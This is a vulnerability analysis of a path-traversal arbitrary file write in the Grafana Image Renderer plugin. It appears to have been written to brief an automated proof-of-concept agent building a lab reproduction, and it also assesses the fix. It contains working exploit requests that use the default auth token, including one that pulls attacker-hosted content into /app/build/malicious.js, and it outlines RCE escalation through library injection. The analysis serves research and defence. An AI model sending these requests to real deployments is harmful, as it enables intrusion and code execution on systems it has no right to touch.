# Vulnerability Analysis: CVE-2025-11539

## Root Cause

**Improper Control of Generation of Code / Code Injection (CWE-94) — Arbitrary File Write via Path Traversal in HTTP Query Parameter**

The Grafana Image Renderer plugin accepts a user-controlled `filePath` query parameter on both the `/render` and `/render/csv` HTTP endpoints. This parameter is passed through the Express request handler directly into file system operations (`fs.copyFileSync()`, `page.screenshot()`, `page.pdf()`) without **any** path validation or sanitization. An attacker who can authenticate to the renderer's HTTP API (trivial with the default auth token `"-"`) can write files to arbitrary locations on the filesystem of the container.

The vulnerability exists because:
1. The `filePath` field in `RenderOptions` / `ImageRenderOptions` is populated directly from `req.query.filePath` in both HTTP handlers
2. No middleware, validator, or function checks the value before it reaches file I/O
3. The parameter accepts both absolute paths (`/etc/cron.d/malicious`) and relative traversal paths (`../../tmp/pwned`)

## Vulnerable File(s) and Function(s)

### Primary: `src/browser/browser.ts`

**`exportCSV()` — Line 453 (CSV download + file copy)**
```typescript
// Line 506-507 — the vulnerable sink
if (options.filePath) {
  fs.copyFileSync(downloadFilePath, options.filePath);  // ARBITRARY FILE WRITE — content from downloaded file
  fs.unlinkSync(downloadFilePath);
  fs.rmdirSync(path.dirname(downloadFilePath));
  filePath = options.filePath;
}
```
The `options.filePath` comes directly from the HTTP query string. The content written is whatever Chromium downloaded from the attacker-controlled `url` parameter, giving the attacker **full control over both the content and the destination path**.

**`takeScreenshot()` — Line 308 (screenshot/PDF write)**
```typescript
// Line 363-364 — if filePath is user-supplied, it's used directly
if (!options.filePath) {
  options.filePath = uniqueFilename(os.tmpdir()) + (isPDF ? '.pdf' : '.png');
}

// Line 399 — PDF write to user-controlled path
page.pdf({ ..., path: options.filePath, ... });

// Line 405 — Screenshot write to user-controlled path
page.screenshot({ path: options.filePath, fullPage: options.fullPageImage, captureBeyondViewport: false });
```
For screenshots, the content is a PNG of whatever page is rendered (limited control). For PDF, the content is a PDF rendering. Both are written to the attacker-controlled path.

### Entry Points: `src/service/http-server.ts`

**`render` handler — Line 188**
```typescript
const options: ImageRenderOptions = {
  url: req.query.url,
  filePath: req.query.filePath,  // USER-CONTROLLED, NO VALIDATION — line 200
  // ...
};
const result = await this.browser.render(options, signal);
```

**`renderCSV` handler — Line 284**
```typescript
const options: RenderOptions = {
  url: req.query.url,
  filePath: req.query.filePath,  // USER-CONTROLLED, NO VALIDATION — line 294
  // ...
};
const result = await this.browser.renderCSV(options, signal);
```

### Additional Entry Point: `src/plugin/v2/grpc_plugin.ts`

**`render` gRPC method — Line 108** passes `req.filePath` (line 130) to the same `Browser.render()`.
**`renderCsv` gRPC method — Line 156** passes `req.filePath` (line 176) to the same `Browser.renderCSV()`.

Both gRPC paths reach the same vulnerable code in `browser.ts`.

### Authentication: `src/service/middlewares.ts`

**`authTokenMiddleware` — Line 26** validates `X-Auth-Token` header against configured token.

### Auth Config: `default.json` — Line 24
```json
"security": {
  "authToken": "-"
}
```

### Auth Validation: `src/config/security.ts` — Line 5
```typescript
export const isAuthTokenValid = (config: SecurityConfig, reqAuthToken: string): boolean => {
  let configToken = config.authToken || [''];
  if (typeof configToken === 'string') {
    configToken = [configToken];
  }
  return reqAuthToken !== '' && configToken.includes(reqAuthToken);
};
```

## Triggering Input

### Vector 1: `/render` endpoint (Screenshot/PDF write — simplest PoC)

```http
GET /render?url=http://grafana:3000/&filePath=/tmp/pwned.png&width=800&height=600&timeout=30 HTTP/1.1
Host: renderer:8081
X-Auth-Token: -
```

- `url`: Any valid HTTP(S) URL that Puppeteer can navigate to (Grafana login page works)
- `filePath`: Arbitrary filesystem path — absolute (`/tmp/pwned.png`) or relative with traversal (`../../tmp/pwned.png`)
- Content written: PNG screenshot of the URL (or PDF if `encoding=pdf`)
- The attacker has **limited control** over file content (it's a rendered screenshot/PDF)

### Vector 2: `/render/csv` endpoint (Arbitrary content write — full exploitation)

```http
GET /render/csv?url=http://attacker-server:9999/malicious-download&filePath=/tmp/pwned.txt&timeout=30 HTTP/1.1
Host: renderer:8081
X-Auth-Token: -
```

- `url`: Must be a URL that triggers a file download in Chromium (e.g., a page with JavaScript `window.location = 'data:...'` or a direct file with `Content-Disposition: attachment`)
- `filePath`: Arbitrary filesystem path
- Content written: Whatever the attacker's server causes Chromium to download — **full control** over content
- This is the more powerful vector but requires the URL to trigger a Chromium download

### Vector 3: gRPC interface

Same vulnerability via the gRPC plugin interface (`renderCsv` / `render` methods). Requires gRPC access to the plugin port. Less likely in external attack scenarios but relevant for Grafana-to-renderer trust boundary bypass.

## Attack Scenario

### Step-by-step exploitation (simplest PoC with /render):

1. **Identify target**: Attacker discovers the image renderer on port 8081 (default)
2. **Authenticate**: Send `X-Auth-Token: -` header (default token)
3. **Trigger file write**: Send GET request:
   ```
   GET /render?url=http://grafana:3000/&filePath=/tmp/pwned.png&width=100&height=100&timeout=30
   ```
4. **Verify**: File `/tmp/pwned.png` is created in the renderer container with a PNG screenshot

### Step-by-step exploitation (full content control with /render/csv):

1. **Set up attacker server**: Host a page that triggers a file download with arbitrary content
   - Serve a page with: `<script>location='data:application/octet-stream;base64,...'</script>`
   - Or serve a file with `Content-Disposition: attachment` header
2. **Authenticate**: Send `X-Auth-Token: -` header
3. **Trigger file write**:
   ```
   GET /render/csv?url=http://attacker:9999/payload&filePath=/app/build/malicious.js&timeout=30
   ```
4. **Result**: Attacker-controlled content is written to `/app/build/malicious.js` inside the container

## Impact

**CVSS 9.9 Critical — Remote Code Execution**

1. **Arbitrary File Write**: Write any content to any path writable by the renderer process
2. **Remote Code Execution**: By writing malicious content to:
   - Application JavaScript files (`build/*.js`) — executed on next service restart
   - Shared libraries in Chromium's library search path — executed on next render
   - Node.js native addons or require-able modules
3. **Data Integrity**: Overwrite configuration files, logs, or other application data
4. **Cross-container impact**: If volumes are shared, writes could affect the host or other containers
5. **Denial of Service**: Overwrite critical files to crash the service

## Authentication Requirements

- **Protocol**: HTTP (default, also supports HTTPS if configured)
- **Auth mechanism**: Static token via `X-Auth-Token` HTTP header
- **Default token**: `-` (single hyphen character)
- **Config location**: `default.json` → `service.security.authToken`
- **Validation**: `src/config/security.ts` — `isAuthTokenValid()` checks exact string match
- **PoC auth header**: `X-Auth-Token: -`
- **Pre-auth?**: No — authentication IS required, but the default token is trivially guessable/known

The PoC agent should always send `X-Auth-Token: -` in all requests.

## Fix Assessment

**The fix is complete and addresses the root cause.**

The fix (commit `1858c2c51347b23f43b1d288bc9222f16030e3f9`) adds `assertNoPathTraversal()`:

```typescript
function assertNoPathTraversal(path?: string | null) {
  if (!path) {
    return;
  }
  if (path.indexOf('/') !== -1 || path.indexOf('\\') !== -1 || path === '..') {
    throw boom.badRequest('File path should not include directories');
  }
}
```

Called at the top of both `takeScreenshot()` and `exportCSV()` in `browser.ts`.

**Why the fix is complete:**

1. **Blocks all directory separators**: Forward slashes (`/`) and backslashes (`\`) are rejected. This prevents:
   - Absolute paths (`/tmp/pwned`)
   - Relative traversal (`../../etc/passwd`)
   - Any path with directory components (`subdir/file`)

2. **Blocks bare `..`**: The `path === '..'` check prevents the degenerate case

3. **URL encoding is not a bypass**: Express's query parser URL-decodes parameters before they reach the handler. `%2F` becomes `/` before `assertNoPathTraversal` runs.

4. **Covers all code paths**: The fix is in `browser.ts`'s `takeScreenshot()` and `exportCSV()`, which are the shared sink methods called by:
   - `Browser` (default mode) — via `render()` and `renderCSV()`
   - `ClusteredBrowser` — via `cluster.task()` which calls `this.exportCSV()` and `this.takeScreenshot()`
   - `ReusableBrowser` — via `render()` and `renderCSV()` which call `this.takeScreenshot()` and `this.exportCSV()`
   - gRPC plugin — via `browser.render()` and `browser.renderCSV()`

5. **Null bytes are not a bypass**: JavaScript's `indexOf` correctly handles null bytes in strings

6. **Unicode confusables are not a bypass**: Characters like ⁄ (U+2044) or ∕ (U+2215) pass the check but are NOT interpreted as path separators by the OS/filesystem

## Potential Bypass Vectors

None identified. The fix is thorough for this vulnerability class.

## Escalation Path

The arbitrary file write primitive from `/render/csv` (full content control) can be escalated to **Remote Code Execution** through several chains:

1. **Overwrite Node.js application code**: Write a malicious JS file to `build/` directory. When the service restarts (or if dynamic `require()` is used), the attacker's code executes. Requires a service restart.

2. **Chromium shared library injection**: Write a malicious `.so` file to a directory in Chromium's library search path. When the next render request launches Chromium, the malicious library is loaded. This is the most practical escalation since renders trigger new Chromium processes.

3. **Overwrite `config.json`**: Change the auth token, rendering config, or other settings to facilitate further attacks.

For the PoC, demonstrating the arbitrary file write primitive (writing to `/tmp/`) is sufficient. Full RCE escalation via `.so` injection is complex and environment-dependent.

## Related Attack Surface

### All paths through `takeScreenshot()` and `exportCSV()` share the same vulnerability

The following browser implementations all ultimately call the vulnerable `takeScreenshot()` and `exportCSV()` from the base `Browser` class:

1. **`src/browser/browser.ts`** — `Browser` class (default mode): `render()` → `takeScreenshot()`, `renderCSV()` → `exportCSV()`
2. **`src/browser/clustered.ts`** — `ClusteredBrowser` class: `render()` → `cluster.execute()` → `this.takeScreenshot()`, `renderCSV()` → `cluster.execute()` → `this.exportCSV()`
3. **`src/browser/reusable.ts`** — `ReusableBrowser` class: `render()` → `this.takeScreenshot()`, `renderCSV()` → `this.exportCSV()`

### gRPC entry point (`src/plugin/v2/grpc_plugin.ts`)

Lines 126-138 and 174-182 pass `req.filePath` without validation into the same browser methods. While the gRPC interface is typically only accessible from the Grafana server process, a compromised Grafana instance (or SSRF in Grafana) could exploit this.

### No other unrelated vulnerable patterns found

Searched for:
- Other uses of `fs.copyFileSync`, `fs.writeFileSync`, `fs.createWriteStream` in `src/` — only the two identified sinks
- Other user-controlled parameters passed to file I/O — only `filePath`
- The `url` parameter is validated to require `http://` or `https://` prefix (`trustedUrlMiddleware`) — no protocol smuggling

## Build System

| Field | Value |
|-------|-------|
| **Language** | TypeScript (Node.js) |
| **Build System** | yarn + TypeScript compiler (`tsc`) |
| **Node.js Version** | >= 22 |
| **Package Manager** | yarn (lock file: `yarn.lock`) |

## Build Commands

```bash
# Install dependencies
yarn install --pure-lockfile

# Compile TypeScript to JavaScript
yarn run build
# Output goes to build/ directory

# Production dependency install (optional, for smaller image)
rm -rf node_modules/ && yarn install --pure-lockfile --production
```

## Dependencies

### Build Dependencies
- `node` >= 22
- `yarn` (classic, v1)
- `typescript` ^5.8.3

### Runtime Dependencies (from package.json)
| Package | Version | Purpose |
|---------|---------|---------|
| `express` | ^4.21.1 | HTTP server |
| `puppeteer` | ^22.8.2 | Headless Chrome automation |
| `@hapi/boom` | ^10.0.0 | HTTP error utilities |
| `chokidar` | ^3.5.2 | File watcher (CSV download detection) |
| `jimp` | ^0.22.10 | Image processing (resize) |
| `multer` | 1.4.5-lts.1 | Multipart form handling |
| `morgan` | ^1.10.0 | HTTP logging |
| `prom-client` | ^14.2.0 | Prometheus metrics |
| `minimist` | ^1.2.6 | CLI argument parsing |
| `lodash` | ^4.17.21 | Utility functions |

### System Dependencies
- **Chromium** browser binary (version 141.0.7390.54 in v4.0.16)
- Fonts: Gothic, WQY ZenHei, Thai TLW, Khmeros, Kacst, FreeFonts, Open Sans, Roboto, Inter
- `tini` — init process for the container
- `locales` — for UTF-8 support

## Runtime Requirements

### Lab Architecture (Docker Compose)

Two containers are needed:

1. **Grafana** (`grafana/grafana-enterprise` or `grafana/grafana`):
   - Port 3000
   - Environment:
     ```
     GF_RENDERING_SERVER_URL=http://renderer:8081/render
     GF_RENDERING_CALLBACK_URL=http://grafana:3000/
     ```
   - Purpose: Provides a valid URL for the renderer to navigate to

2. **Image Renderer** (built from source at v4.0.16):
   - Port 8081
   - Environment:
     ```
     CHROME_BIN=/usr/bin/chromium
     PUPPETEER_SKIP_CHROMIUM_DOWNLOAD=true
     NODE_ENV=production
     ```
   - Auth token: `-` (default from `default.json` copied as `config.json`)

### Simplified Lab Build Approach

Rather than reproducing the complex multi-stage Dockerfile, a simpler approach for the lab:

```dockerfile
FROM node:22

# Install Chromium
RUN apt-get update && apt-get install -y chromium fonts-open-sans tini && rm -rf /var/lib/apt/lists/*

WORKDIR /app
COPY . .
RUN yarn install --pure-lockfile && yarn run build

ENV CHROME_BIN=/usr/bin/chromium
ENV PUPPETEER_SKIP_CHROMIUM_DOWNLOAD=true
ENV NODE_ENV=production

EXPOSE 8081
ENTRYPOINT ["tini", "--"]
CMD ["node", "build/app.js", "server", "--config=config.json"]
```

Where `config.json` is a copy of `default.json` (which has the default auth token `-`).

### Network Setup
- The renderer must be able to reach the Grafana container on port 3000 (for the `url` parameter)
- The renderer must expose port 8081 for the PoC to send exploit requests
- For the `/render/csv` full-content-control attack, an attacker-controlled HTTP server must be reachable from the renderer container

### PoC Approach Summary

**Simplest PoC (recommended for initial verification):**
1. Send `GET /render?url=http://grafana:3000/&filePath=/tmp/pwned.png&width=100&height=100&timeout=30` with `X-Auth-Token: -`
2. Exec into the renderer container and verify `/tmp/pwned.png` exists
3. This demonstrates the arbitrary file write with a single HTTP request

**Full content control PoC:**
1. Run a small HTTP server that serves a page triggering a download of attacker-controlled binary content
2. Send `GET /render/csv?url=http://attacker:PORT/trigger-download&filePath=/tmp/pwned.bin&timeout=30` with `X-Auth-Token: -`
3. Verify `/tmp/pwned.bin` has the exact attacker-controlled content

Both approaches use only the default auth token and a single HTTP request.
